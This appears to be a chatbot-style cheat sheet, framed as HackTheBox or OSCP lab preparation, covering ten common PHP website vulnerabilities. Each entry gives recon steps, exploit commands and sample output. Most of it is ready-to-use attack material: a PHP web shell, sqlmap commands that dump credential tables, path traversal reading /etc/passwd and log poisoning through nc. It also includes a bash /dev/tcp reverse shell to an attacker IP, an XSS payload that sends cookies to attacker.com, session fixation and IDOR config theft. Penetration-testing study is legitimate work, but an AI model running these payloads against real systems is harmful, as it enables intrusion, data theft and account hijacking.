Here‚Äôs an expanded breakdown of the 10 most common PHP site vulnerabilities, including real-world-style recon, exploitation, usage, and output examples‚Äîmodeled after what you‚Äôd encounter in HackTheBox or OSCP labs.

1. üî• Remote Code Execution (RCE)
Recon:
Scan forms or parameters passed to system functions (e.g., ?cmd=ls)

Look for eval, system, exec references in source or error logs

Exploitation:
php
Copy
Edit
http://target.com/index.php?cmd=whoami
Usage:
bash
Copy
Edit
curl 'http://target.com/index.php?cmd=whoami'
Output:
kotlin
Copy
Edit
www-data
2. üìÅ File Upload Vulnerabilities
Recon:
Find image or document upload forms

Use Burp to check MIME type and allowed extensions

Exploitation:
Upload shell.php.jpg, intercept in Burp, change filename to shell.php.

Usage:
php
Copy
Edit
<?php system($_GET['cmd']); ?>
Access:

bash
Copy
Edit
http://target.com/uploads/shell.php?cmd=id
Output:
kotlin
Copy
Edit
uid=33(www-data) gid=33(www-data) groups=33(www-data)
3. üíâ SQL Injection (SQLi)
Recon:
Login pages, search boxes, or URLs with id=

foo' OR '1'='1, '--, ORDER BY n testing

Exploitation:
bash
Copy
Edit
sqlmap -u "http://target.com/product.php?id=1" --dbs
Usage:
bash
Copy
Edit
sqlmap -u "http://target.com/product.php?id=1" --dump -D users -T creds
Output:
pgsql
Copy
Edit
Database: users
Table: creds
+----+----------+-----------+
| id | username | password  |
+----+----------+-----------+
| 1  | admin    | letmein   |
+----+----------+-----------+
4. üìú Local File Inclusion (LFI) / RFI
Recon:
Check URL patterns like page=home.php

Try ../../../../etc/passwd or php://filter

Exploitation:
bash
Copy
Edit
curl "http://target.com/index.php?page=../../../../etc/passwd"
Output:
ruby
Copy
Edit
root:x:0:0:root:/root:/bin/bash
For RCE via log poisoning:

bash
Copy
Edit
echo "<?php system($_GET['cmd']); ?>" | nc target.com 80
curl 'http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id'
5. ‚õìÔ∏è Command Injection
Recon:
Ping, traceroute, DNS tools with user input

Try appending ; id, && whoami

Exploitation:
bash
Copy
Edit
http://target.com/ping.php?host=127.0.0.1;id
Output:
ini
Copy
Edit
uid=33(www-data) gid=33(www-data)
Reverse shell:

bash
Copy
Edit
http://target.com/ping.php?host=127.0.0.1;bash -c "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"
6. üß¨ PHP Deserialization
Recon:
Look for unserialize() usage in source

Sessions or parameters with base64 strings

Exploitation:
php
Copy
Edit
O:8:"ExploitMe":1:{s:4:"data";s:13:"system('id');";}
Use phpggc:

bash
Copy
Edit
phpggc monolog/rce1 system id | base64
Pass payload:

bash
Copy
Edit
curl -b "data=<base64_payload>" http://target.com/vuln.php
Output:
ini
Copy
Edit
uid=33(www-data)
7. üß† Exposed PHP Info / Source
Recon:
Try /phpinfo.php, .git, .bak, .swp, .~ files

Use feroxbuster:

bash
Copy
Edit
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x .php,.bak,.swp,.zip
Exploitation:
/phpinfo.php shows upload temp dir: /tmp/php123

Upload PHP payload and access temp location

8. üéüÔ∏è Session Management Flaws
Recon:
Inspect cookies like PHPSESSID=

Attempt session fixation or reuse

Exploitation:
Fixate session:

bash
Copy
Edit
curl -c cookies.txt "http://target.com/login.php?PHPSESSID=attacker123"
Have victim login. Then:

bash
Copy
Edit
curl -b cookies.txt http://target.com/admin.php
9. üíâ Cross-Site Scripting (XSS)
Recon:
Input reflected back in response

Use payloads like <script>alert(1)</script>

Exploitation:
bash
Copy
Edit
http://target.com/search.php?q=<script>fetch('http://attacker.com?'+document.cookie)</script>
Output:
Admin‚Äôs session cookies are sent to attacker's server.

10. üö´ Improper Access Control / IDOR
Recon:
Manually change URL params (user_id=1 ‚Üí user_id=2)

Test role functionality without proper auth

Exploitation:
bash
Copy
Edit
curl -b "PHPSESSID=guest" "http://target.com/admin.php"
curl "http://target.com/download.php?file=../../config.php"
Output:
Dumped sensitive config or unauthorized admin access.
